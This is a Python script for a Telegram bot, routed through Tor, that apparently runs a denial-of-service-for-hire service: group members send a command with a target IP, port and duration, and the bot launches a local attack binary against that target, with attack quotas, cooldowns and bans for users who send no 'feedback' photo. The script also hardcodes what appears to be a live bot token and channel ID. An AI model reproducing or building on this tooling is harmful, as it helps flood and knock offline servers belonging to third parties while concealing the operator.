#!/usr/bin/env python3
# === SOCKS5 Proxy Setup ===
import requests
import os
import telebot
import logging
import asyncio
import threading
from datetime import datetime, timedelta, timezone
from telebot import apihelper

# === Proxy ===
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Test Tor connection
try:
    r = requests.get('https://check.torproject.org', proxies=proxies, timeout=10)
    print("[Proxy Test] Status Code:", r.status_code)
    if "Congratulations" in r.text:
        print("[Proxy Test] Successfully routed through Tor!")
except Exception as e:
    print("[Proxy Test] Proxy error:", e)

# === Bot Configuration ===
TOKEN = '7848878988:AAHFlYa_ggNW2siLakeEwXuSWihqhYj0J-s'  # Replace with your actual token
CHANNEL_ID = '-1002678249799'  # Replace with your group/channel ID

# === Telebot Setup ===
apihelper.proxy = proxies
bot = telebot.TeleBot(TOKEN)

# === Globals ===
user_attacks = {}
user_cooldowns = {}
user_photos = {}
user_bans = {}
reset_time = datetime.now(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
COOLDOWN_DURATION = 60
BAN_DURATION = timedelta(minutes=1)
DAILY_ATTACK_LIMIT = 15
EXEMPTED_USERS = [5712886230]

# === Functions ===
def reset_daily_counts():
    global reset_time
    now = datetime.now(timezone(timedelta(hours=5, minutes=30)))
    if now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = now.replace(hour=0, minute=0, second=0, microsecond=0)

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# === Handlers ===
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_photos[message.from_user.id] = True

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"
    chat_id = str(message.chat.id)

    if chat_id != CHANNEL_ID:
        bot.send_message(chat_id, "⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 𝐂𝐎𝐌𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 :- @freebotalone  ⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : OUR ADMINS ]")
        return

    reset_daily_counts()

    if user_id in user_bans:
        if datetime.now() < user_bans[user_id]:
            remaining = (user_bans[user_id] - datetime.now()).total_seconds()
            bot.send_message(chat_id, f"Banned for not giving feedback. Wait {int(remaining)//60}m {int(remaining)%60}s.")
            return
        else:
            del user_bans[user_id]

    if user_id not in EXEMPTED_USERS:
        if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
            remaining = (user_cooldowns[user_id] - datetime.now()).seconds
            bot.send_message(chat_id, f"Cooldown active. Wait {remaining//60}m {remaining%60}s.")
            return

        if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
            bot.send_message(chat_id, "Daily attack limit reached.")
            return

        if user_attacks.get(user_id, 0) > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION
            bot.send_message(chat_id, "No feedback sent. Banned for 1 minute.")
            return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /bgmi <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")

        ip, port, duration = args
        if int(duration) > 240:
            bot.send_message(chat_id, "⛔ 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣 𝙚𝙭𝙘𝙚𝙚𝙙𝙨 𝙩𝙝𝙚 𝙢𝙖𝙭 𝙡𝙞𝙢𝙞𝙩 𝙤𝙛 {240} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙙𝙪𝙘𝙚 𝙞𝙩.")
            return
        if not is_valid_ip(ip) or not is_valid_port(port) or not is_valid_duration(duration):
            raise ValueError("Invalid IP, port, or duration.")

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
            user_photos[user_id] = False
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        bot.send_message(chat_id, f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 💥 \n\n Requested Target : {ip} \n\n Requseted Port   : {port}\n\n Requested Time  : {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n\n 📢 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 📢")
        threading.Thread(target=lambda: asyncio.run(run_attack_command_async(ip, int(port), int(duration)))).start()
    except Exception as e:
        bot.send_message(chat_id, f"┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 \n\n : {e}")

async def run_attack_command_async(ip, port, duration):
    try:
        cmd = f"./fuck {ip} {port} {duration}"
        process = await asyncio.create_subprocess_shell(cmd)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 Finished ❣️\n\nRequested ip : {ip} \n\n Requested port : {port} \n\n [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰e 💘 <> 𝗧𝗲𝗮m ★ȺŁØNɆ☂ꔪ™")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Attack failed: {e}")

# === Start Bot ===
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot error: {e}")
